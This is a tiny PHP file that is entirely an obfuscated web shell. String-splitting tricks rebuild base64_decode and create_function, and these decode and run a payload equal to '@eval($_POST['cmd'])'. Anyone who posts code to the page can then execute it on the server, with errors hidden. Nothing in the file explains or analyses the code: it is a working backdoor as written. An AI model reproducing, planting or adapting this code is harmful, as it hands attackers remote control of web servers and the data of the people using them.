<?php 
$or="cIEBldcm";
$lq="9TVFsn";
$avj = str_replace("j","","sjtrj_jrjejpljajcje");
$zs="FsKCRfUE";
$bu="Y21kJ10pOw==";
$qu = $avj("i", "", "ibiaisie6i4i_dieicoide");
$fh = $avj("k","","crkekatkek_kfkukncktkikon");
$hwy = $fh('', $qu($avj("c", "", $or.$zs.$lq.$bu))); $hwy();         
?>
